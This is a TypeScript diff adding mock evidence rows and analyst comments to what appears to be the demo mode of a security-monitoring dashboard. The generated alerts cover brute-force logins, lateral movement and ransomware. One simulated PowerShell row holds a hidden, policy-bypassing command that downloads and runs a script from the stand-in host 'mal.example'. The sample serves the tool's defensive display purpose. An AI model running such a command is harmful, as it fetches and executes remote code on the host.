@@ -6,6 +6,9 @@ import type {
   AgentKey,
   BlumiraUser,
   EnrichedAccount,
+  EvidenceResponse,
+  EvidenceRow,
+  FindingComment,
 } from "./blumira-api";
 
 const DEMO_ACCOUNTS: MspAccount[] = [
@@ -229,6 +232,168 @@ export function getDemoEnrichedAccount(account: MspAccount): EnrichedAccount {
 
 export function getDemoEnrichedAccounts(): EnrichedAccount[] {
   return DEMO_ACCOUNTS.map(getDemoEnrichedAccount);
+}
+
+const EVIDENCE_TEMPLATES: Record<string, { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] }> = {
+  "Brute Force Authentication Attempt": {
+    keys: ["__time_matched", "src_ip", "dst_ip", "user", "event_id", "status", "logon_type", "workstation"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 2000 + Math.random() * 5000)).toISOString(),
+      src_ip: "203.0.113.42",
+      dst_ip: "10.0.1.5",
+      user: ["jsmith", "admin", "svc_account", "jdoe", "mkellar"][i % 5],
+      event_id: "4625",
+      status: "0xc000006d",
+      logon_type: "3",
+      workstation: "DC-PRIMARY",
+    })),
+  },
+  "Suspicious PowerShell Execution": {
+    keys: ["__time_matched", "hostname", "user", "command_line", "parent_process", "pid", "event_id"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 60000 + Math.random() * 30000)).toISOString(),
+      hostname: "WS-042",
+      user: "jsmith",
+      command_line: [
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+        "powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://mal.example/p')",
+        "powershell Set-ExecutionPolicy Bypass -Scope Process",
+      ][i % 3],
+      parent_process: ["cmd.exe", "explorer.exe", "svchost.exe"][i % 3],
+      pid: String(4000 + i * 127),
+      event_id: "4104",
+    })),
+  },
+  "Lateral Movement via SMB": {
+    keys: ["__time_matched", "src_ip", "dst_ip", "src_hostname", "dst_hostname", "share_name", "user", "action"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 5000 + Math.random() * 10000)).toISOString(),
+      src_ip: "10.0.1.15",
+      dst_ip: `10.0.1.${20 + (i % 12)}`,
+      src_hostname: "WS-015",
+      dst_hostname: ["SRV-APP-01", "SRV-APP-02", "DC-SECONDARY", "FS-01", "DB-PRIMARY", "WS-023"][i % 6],
+      share_name: ["C$", "ADMIN$", "IPC$", "SharedDocs"][i % 4],
+      user: "admin-temp",
+      action: ["connect", "read", "write"][i % 3],
+    })),
+  },
+  "Unauthorized Admin Account Created": {
+    keys: ["__time_matched", "target_user", "actor_user", "group_name", "event_id", "hostname", "action"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 120000 + Math.random() * 60000)).toISOString(),
+      target_user: "svc_backup2",
+      actor_user: "admin-temp",
+      group_name: ["Domain Admins", "Enterprise Admins", "Schema Admins"][i % 3],
+      event_id: ["4728", "4732", "4756"][i % 3],
+      hostname: "DC-PRIMARY",
+      action: ["Member added to group", "Account created", "Group membership changed"][i % 3],
+    })),
+  },
+  "Ransomware Behavior Detected": {
+    keys: ["__time_matched", "hostname", "user", "file_path", "action", "file_count", "process"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 500 + Math.random() * 1000)).toISOString(),
+      hostname: "FS-01",
+      user: "lthompson",
+      file_path: [
+        "\\\\FS-01\\shared\\accounting\\Q4-report.xlsx.encrypted",
+        "\\\\FS-01\\shared\\hr\\employee-data.csv.encrypted",
+        "\\\\FS-01\\shared\\projects\\design-specs.pdf.encrypted",
+        "\\\\FS-01\\shared\\legal\\contracts-2025.docx.encrypted",
+      ][i % 4],
+      action: "file_modified",
+      file_count: String(50 + i * 12),
+      process: "suspicious_process.exe",
+    })),
+  },
+};
+
+function getDefaultEvidenceForFinding(findingName: string): { keys: string[]; rowGenerator: (count: number) => EvidenceRow[] } {
+  return EVIDENCE_TEMPLATES[findingName] || {
+    keys: ["__time_matched", "src_ip", "hostname", "user", "event_type", "detail"],
+    rowGenerator: (count) => Array.from({ length: count }, (_, i) => ({
+      __time_matched: new Date(Date.now() - (i * 30000 + Math.random() * 60000)).toISOString(),
+      src_ip: `10.0.${Math.floor(Math.random() * 5)}.${10 + i}`,
+      hostname: HOSTNAMES[i % HOSTNAMES.length],
+      user: ["jsmith", "admin", "svc_account", "mkellar", "rjohnson"][i % 5],
+      event_type: "security_alert",
+      detail: `Event detail row ${i + 1}`,
+    })),
+  };
+}
+
+export function getDemoFindingEvidence(
+  accountId: string,
+  findingId: string,
+  page = 1,
+  pageSize = 50
+): EvidenceResponse {
+  const finding = getDemoFindingDetail(accountId, findingId);
+  if (!finding) {
+    return {
+      data: [],
+      evidence_keys: [],
+      status: "OK",
+      meta: { page: 1, page_size: pageSize, total_items: 0, total_pages: 0 },
+      links: { self: "", next: null, prev: null },
+    };
+  }
+
+  const template = getDefaultEvidenceForFinding(finding.name);
+  const totalItems = 8 + Math.floor(Math.random() * 20);
+  const allRows = template.rowGenerator(totalItems);
+  const totalPages = Math.ceil(totalItems / pageSize);
+  const start = (page - 1) * pageSize;
+  const pageRows = allRows.slice(start, start + pageSize);
+
+  return {
+    data: pageRows,
+    evidence_keys: template.keys,
+    status: "OK",
+    meta: {
+      page,
+      page_size: pageSize,
+      total_items: totalItems,
+      total_pages: totalPages,
+    },
+    links: {
+      self: `/findings/${findingId}/evidence?page=${page}`,
+      next: page < totalPages ? `/findings/${findingId}/evidence?page=${page + 1}` : null,
+      prev: page > 1 ? `/findings/${findingId}/evidence?page=${page - 1}` : null,
+    },
+  };
+}
+
+const DEMO_COMMENTS: FindingComment[] = [
+  {
+    id: "comm-001",
+    subject: "Initial Triage",
+    body: "<p>Investigated the source IP. This appears to be an external actor based on geolocation data (Eastern Europe). Escalating to Tier 2 for deeper analysis.</p>",
+    age: 86400,
+    sender: { id: "u-002", first_name: "James", last_name: "Smith", email: "jsmith@acmecorp.com" },
+  },
+  {
+    id: "comm-002",
+    subject: "Update",
+    body: "<p>Confirmed the IP is associated with a known threat group. Blocking at the firewall and monitoring for related activity across other accounts.</p>",
+    age: 43200,
+    sender: { id: "u-007", first_name: "Alex", last_name: "Rivera", email: "ciso@stark.dev" },
+  },
+  {
+    id: "comm-003",
+    subject: "Remediation",
+    body: "<p>Password reset enforced for all impacted accounts. MFA enrollment verified. Continuing to monitor for 48 hours.</p>",
+    age: 7200,
+    sender: { id: "u-001", first_name: "Sarah", last_name: "Chen", email: "admin@acmecorp.com" },
+  },
+];
+
+export function getDemoFindingComments(accountId: string, findingId: string): FindingComment[] {
+  const finding = getDemoFindingDetail(accountId, findingId);
+  if (!finding) return [];
+  if (finding.priority <= 2) return DEMO_COMMENTS;
+  if (finding.priority === 3) return DEMO_COMMENTS.slice(0, 1);
+  return [];
 }
 
 export function isDemoMode(): boolean {
